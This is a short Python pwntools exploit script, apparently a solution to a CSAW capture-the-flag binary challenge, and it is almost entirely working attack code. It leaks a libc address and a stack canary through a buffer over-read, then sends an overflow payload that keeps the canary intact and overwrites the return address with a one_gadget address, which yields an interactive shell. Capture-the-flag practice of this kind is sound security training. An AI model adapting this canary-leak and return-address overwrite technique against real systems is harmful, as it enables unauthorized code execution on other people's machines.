# by hgarrereyn

from pwn import *
import binascii

sock = remote('pwn.chal.csaw.io', 3764)

# sniff libc pointer
libc_offset = 238233
sock.recvuntil('>>')
sock.sendline('1')
sock.recvuntil('>>')
sock.sendline('a' * 39)
sock.recvuntil('>>')
sock.sendline('2')

# decode the libc pointer
r = sock.recvuntil('>>')
libc_p_raw = r.split('\n')[6][:6]
libc_p = int(binascii.hexlify(libc_p_raw[::-1]), 16)

libc_base = libc_p - libc_offset
print 'libc base:', hex(libc_base)

# sniff stack cookie
sock.sendline('1')
sock.recvuntil('>>')
sock.sendline('a' * 168)
sock.recvuntil('>>')
sock.sendline('2')

# decode the cookie
r = sock.recvuntil('>>')
cookie = '\x00' + r.split('\n')[6][:7]

print 'cookie:', binascii.hexlify(cookie)

# magic gadget (from one_gadget)
sock.sendline('1')
sock.recvuntil('>>')

buff = ''
buff += 'a' * 168
buff += cookie
buff += 'b' * 8
buff += p64(libc_base + 0xf1117)

sock.sendline(buff)

# trigger the attack by exiting
sock.recvuntil('>>')
sock.sendline('3')

# have a shell
sock.interactive()
